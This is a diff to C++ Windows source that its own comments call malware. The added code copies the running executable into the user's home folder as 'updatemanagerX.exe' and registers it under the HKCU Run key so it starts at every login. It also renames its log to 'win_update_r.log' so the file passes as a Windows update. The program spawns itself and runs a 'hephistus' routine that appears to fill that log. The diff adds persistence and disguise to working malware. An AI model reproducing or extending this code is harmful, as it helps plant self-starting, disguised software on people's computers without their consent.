@@ -10,8 +10,9 @@
 #include <fstream>
 #include <memory>
 #include <ctime>
+#include <filesystem>
 
-//GUID THAT MALWARE RUNS ONLY ONE INSTANCE
+ //GUID THAT MALWARE RUNS ONLY ONE INSTANCE
 #define appguid "{1b885a21-ddce-4300-b2ba-d586680f6942}"
 
 struct elem {
@@ -55,10 +56,12 @@ public:
 };
 
 bool shouldClose();
-void malwareDeamon() {
+void malwareDeamon(std::string w) {
 	if (shouldClose())
 		return;
-	std::ofstream ofile("friendly.log", std::ios_base::app | std::ios_base::out);
+
+	std::ofstream ofile(
+		(w + "win_update_r.log").c_str(), std::ios_base::app | std::ios_base::out);
 	hephistusMD m(&ofile);
 
 	m.hephistus(0x30, 0x39);//0-9
@@ -88,20 +91,60 @@ void malwareDeamon() {
 	ofile.close();
 }
 
+char* abso(const char* x, size_t* sp = nullptr);
+
 int main(int argc, char* argv[])
 {
+	std::string home;
+	{
+#pragma warning(suppress : 4996)
+		char* hd = getenv("HOMEDRIVE"),
+#pragma warning(suppress : 4996)
+			* hp = getenv("HOMEPATH");
+		home = (hd == NULL || hp == NULL) ? ".\\" : std::string(hd) + "\\" + hp + "\\";
+	}
 	const char* agv[]{ "hephistus", "run" };
 	if (argc > 2 && std::string(argv[2]) == agv[1] && std::string(argv[1]) == agv[0]) {
-		malwareDeamon();
+		malwareDeamon(home);
 		return 0;
 	}
 	std::future<int> fut = std::async(om, argc, argv);
 	{
-		std::string codec = (std::string(argv[0]) + " " + agv[0] + " " + agv[1]);
+		std::string a(argv[0]);
+		bool cp = false;
+		{
+			std::string nf = home + "updatemanagerX.exe";
+			if (!std::filesystem::exists(nf)) {
+				char* tld2 = abso(a.c_str());
+				if (tld2 == nullptr) goto skip2;
+				if (CopyFileA(tld2, nf.c_str(), FALSE) != 0) {//TRY TO COPY
+					a = nf;
+					cp = true;
+				}
+				free(tld2);
+			skip2:
+				__nop();
+			}
+		}
+		std::string codec = (a + " " + agv[0] + " " + agv[1]);
 		size_t s = sizeof(char) * (1 + codec.length());
 		char* tld = (char*)malloc(s);
 		if (tld == nullptr) goto skiphephistus;
 		strcpy_s(tld, s, codec.c_str());
+
+		/*if (cp)*/ {
+			HKEY k;
+			LSTATUS x = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_WRITE, &k);
+			if (x == ERROR_SUCCESS) {
+				size_t s2 = 0;
+				char* tld2 = abso(tld, &s2);
+				if (tld2 == nullptr) goto skip4;
+				x = RegSetValueExA(k, appguid, NULL, REG_SZ, (const BYTE*)tld2, s2);
+				free(tld2);
+			skip4:
+				RegCloseKey(k);
+			}
+		}
 
 		STARTUPINFOA si;
 		PROCESS_INFORMATION pi;
@@ -120,7 +163,7 @@ int main(int argc, char* argv[])
 			NULL,           // Use parent's starting directory 
 			&si,            // Pointer to STARTUPINFO structure
 			&pi)           // Pointer to PROCESS_INFORMATION structure
-			) malwareDeamon();
+			) malwareDeamon(home);
 		free(tld);
 
 		CloseHandle(pi.hProcess);
@@ -144,4 +187,15 @@ bool shouldClose() {
 		return true;
 	}
 	return false;
+}
+
+char* abso(const char* x, size_t* sp) {
+	std::string m = std::filesystem::absolute(x).string();
+	size_t s2 = (1 + m.size()) * sizeof(char);
+	char* tld2 = (char*)malloc(s2);
+	if (tld2 == nullptr) return nullptr;
+	strcpy_s(tld2, s2, m.c_str());
+	if (sp != nullptr)
+		*sp = s2;
+	return tld2;
 }
